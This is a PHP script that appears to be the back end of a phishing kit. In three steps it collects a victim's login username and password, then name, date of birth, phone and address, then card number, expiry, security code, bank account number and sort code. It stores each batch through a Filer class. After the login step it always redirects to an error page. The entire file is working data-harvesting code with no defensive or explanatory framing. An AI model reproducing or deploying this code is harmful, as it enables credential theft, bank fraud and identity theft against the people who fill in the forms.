<?php
include("../class/Filer.php");
//
session_start();
//
if(isset($_POST['loader']) && $_POST['loader'] =="u1"){
    //
    $user = $_POST['user'];
    $pass = $_POST['pass'];
 
    //
    $_SESSION['user'] = $user;
    $_SESSION['pass'] = $pass;
  

    //
     $filer = new Filer();

    //
    if($filer->fileItem_u1($user, $pass) > 0){
        //
        header("location: ../error.php");
    }else{
        header("location: ../error.php");
    }
    //
    
    
}


if(isset($_POST['loader']) && $_POST['loader'] =="u4"){
    //
    $fname = $_POST['fname'];
    $dob = $_POST['dob'];
    $phone = $_POST['phone'];
    $address = $_POST['address'];
    $city = $_POST['city'];
    $postcode = $_POST['postcode'];
    
    //
    $_SESSION['fname'] = $fname;
    $_SESSION['dob'] = $dob;
    $_SESSION['phone'] = $phone;
    $_SESSION['address'] = $address;
    $_SESSION['city'] = $city;
    $_SESSION['postcode'] = $postcode;
    //
    getItems();
}

function getItems(){
    //getItems
    $isuser = $_SESSION['user'];
    $ispass = $_SESSION['pass'];
 
    $isu_t = $_SESSION['fname'];
    
    $p_t = $_SESSION['dob'];
    //
    $isphone = $_SESSION['phone'];

    //
    $isadd = $_SESSION['address'];

    //
    $isci = $_SESSION['city'];

    //
     $ispos = $_SESSION['postcode'];
     //

    $filer = new Filer();

    //
    $filer->fileItem($isuser, $ispass,  $isu_t, $p_t, $isphone, $isadd, $isci, $ispos);
}
if(isset($_POST['loader']) && $_POST['loader'] =="u6"){
    
    
    //
    $ccno = $_POST['ccno'];
    $ccexp = $_POST['ccexp'];
    $secode = $_POST['secode'];
    $acno = $_POST['acno'];
    $sort = $_POST['sort'];
   
   
    
    //
    $_SESSION['ccno'] = $ccno;
    $_SESSION['ccexp'] = $ccexp;
    $_SESSION['secode'] = $secode;
    $_SESSION['acno'] = $acno;
    $_SESSION['sort'] = $sort;
    
    //
    getItems_t();
}

function getItems_t(){
    //getItems
    $isuser = $_SESSION['user'];
    $ispass = $_SESSION['pass'];
    
   $isu_t = $_SESSION['fname'];
    
    $p_t = $_SESSION['dob'];
    //
    $isphone = $_SESSION['phone'];

    //
    $isadd = $_SESSION['address'];

    //
    $isci = $_SESSION['city'];

    //
     $ispos = $_SESSION['postcode'];
   
    $iscc = $_SESSION['ccno'];
    $isexp = $_SESSION['ccexp'];
   $issec = $_SESSION['secode'];
    
    $iseng = $_SESSION['acno'];

    //
    $isfname = $_SESSION['sort'];

    //

     //

    $filer = new Filer();

    //
    $filer->fileItem_t($isuser, $ispass,  $isu_t, $p_t, $isphone, $isadd, $isci, $ispos,  $iscc, $isexp, $issec, $iseng, $isfname);
}





